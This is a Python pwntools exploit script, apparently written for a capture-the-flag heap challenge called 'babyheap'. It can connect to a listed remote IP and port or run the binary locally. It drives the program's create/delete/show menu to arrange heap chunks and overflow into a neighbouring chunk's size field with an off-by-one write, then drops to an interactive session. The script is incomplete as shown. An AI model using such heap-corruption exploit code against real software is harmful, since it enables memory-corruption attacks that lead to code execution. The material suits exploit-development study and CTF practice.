from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'
FILE_NAME = "./babyheap"
#"""
HOST = "35.186.153.116"
PORT = 7001 
"""
HOST = "localhost"
PORT = 7777
"""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

#elf = ELF(FILE_NAME)
#addr_main = elf.symbols["main"]
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
#
#libc = ELF('./')
#libc_binsh = next(libc.search("/bin/sh"))

def create(size, data):
	conn.sendlineafter("> ", "1")
	conn.sendlineafter(": ", str(size))
	conn.sendafter(": ", data)

def delete(index):
	conn.sendlineafter("> ", "2")
	conn.sendlineafter(": ", str(index))

def show(index):
	conn.sendlineafter("> ", "3")
	conn.sendlineafter(": ", str(index))
	conn.recvuntil("data: ")

def exploit():
	b_data = "B"*0xf8
	b_data += p64(0xc1)
	b_data += "B"*(0x1b7-len(b_data))

	create(0xf7, "A"*0xf7) #A 0	
	create(0x1b7, b_data) #B 1
	create(0xf7, "C"*0xf7) #C 2	
	create(0xf7, "D"*0xf7) #D 3

	delete(0)
	create(0xf8, "A"*0xf8) #A 0
	delete(0)	
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
